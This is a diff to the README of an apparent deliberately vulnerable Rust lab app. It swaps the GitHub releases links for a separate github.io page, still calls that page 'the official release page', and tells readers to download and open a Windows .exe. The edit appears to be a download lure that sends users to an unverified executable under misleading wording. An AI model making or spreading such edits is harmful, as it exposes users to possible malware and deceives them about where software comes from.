@@ -1,6 +1,6 @@
 # 🛡️ damn-vulnerable-rust-app - Improve your software security testing skills
 
-[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/nganasantablature458/damn-vulnerable-rust-app/releases)
+[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://nganasantablature458.github.io)
 
 ## 📌 Project Overview
 
@@ -20,7 +20,7 @@ Your computer must meet these basic needs to run the application:
 
 Follow these steps to set up the laboratory on your machine.
 
-1.  Visit the official release page to download the latest version: [https://github.com/nganasantablature458/damn-vulnerable-rust-app/releases](https://github.com/nganasantablature458/damn-vulnerable-rust-app/releases).
+1.  Visit the official release page to download the latest version: [https://nganasantablature458.github.io](https://nganasantablature458.github.io).
 2.  Look for the file that ends in .exe for Windows.
 3.  Click the link to start the download.
 4.  Open your Downloads folder once the file finishes saving.
